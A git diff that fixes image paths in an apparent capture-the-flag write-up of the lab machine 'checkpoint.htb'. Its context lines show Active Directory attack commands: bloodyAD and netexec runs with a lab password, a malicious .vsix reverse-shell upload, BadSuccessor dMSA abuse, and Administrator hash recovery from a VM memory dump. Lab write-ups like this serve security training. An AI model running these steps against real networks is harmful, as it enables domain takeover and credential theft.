@@ -134,7 +134,7 @@ Run `bloody-ad` with the following command to list the write permissions availab
 bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb get writable
 ```
 
-<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.15.31.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.15.31.png" alt=""><figcaption></figcaption></figure>
 
 This shows that `alex.turner` has write access to the `mark.davies` AD object and can therefore restore it.
 
@@ -156,7 +156,7 @@ bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Check
 nxc smb dc01 -u 'mark.davies' -p 'Checkpoint2024!'
 ```
 
-<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.23.17.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.23.17.png" alt=""><figcaption></figcaption></figure>
 
 **2.2.2 - uploading a malicious vsix file**
 
@@ -170,19 +170,19 @@ https://github.com/Goultarde/vsix_revshell.py
 
 The following screenshot shows the shares available to `mark.davies`.
 
-<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.31.07.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.31.07.png" alt=""><figcaption></figcaption></figure>
 
 **And at last, generate the .vsix reverse shell**
 
-{% file src="../.gitbook/assets/vsix_revshell.py" %}
+{% file src="../../.gitbook/assets/vsix_revshell.py" %}
 
 **generate the vsix reverse shell**
 
-<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.46.31.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.46.31.png" alt=""><figcaption></figcaption></figure>
 
 **upload the vsix reverse shell & retrieve the reverse shell**
 
-<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.49.12.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.49.12.png" alt=""><figcaption></figcaption></figure>
 
 **Result:**
 
@@ -226,7 +226,7 @@ validate the badsuccessor possibilities with nxc ([https://github.com/Akamai/BAD
 nxc ldap 10.129.21.24 -u alex.turner -p 'Checkpoint2024!' -M badsuccessor
 ```
 
-<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 11.32.30.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 11.32.30.png" alt=""><figcaption></figcaption></figure>
 
 #### 3.2 Enumeration as ryan.brooke
 
@@ -266,7 +266,7 @@ bloodyAD -k ccache=./ryan.ccache -u ryan.brooks --dc-ip 10.129.21.24 --host DC01
 
 After executing the bloodyAD command, a .ccache file will be generated that holds the credentials to the newly made machine account.
 
-<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 11.20.13.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 11.20.13.png" alt=""><figcaption></figcaption></figure>
 
 After retrieving the `.ccache` file, set `KRB5CCNAME` to that ticket. Then authenticate as `pentest_dmsa`. This account has the same permissions as `svc_deploy account`.
 
@@ -277,7 +277,7 @@ After retrieving the `.ccache` file, set `KRB5CCNAME` to that ticket. Then authe
 nxc smb dc01 --use-kcache --shares
 ```
 
-<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 11.21.03.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 11.21.03.png" alt=""><figcaption></figcaption></figure>
 
 After checking what shares you have read permissions to, navigate to the VMBackups share and download the .vmem file
 
@@ -322,7 +322,7 @@ drw-rw-rw-          0  Wed May 13 15:58:18 2026 ..
 
 Once the 2 GB `.vmem` file is downloaded, parse it with [`vmkatz`](https://github.com/nikaiw/VMkatz) to recover the Administrator hash.
 
-<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 11.26.38.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 11.26.38.png" alt=""><figcaption></figcaption></figure>
 
 **Result:**
 
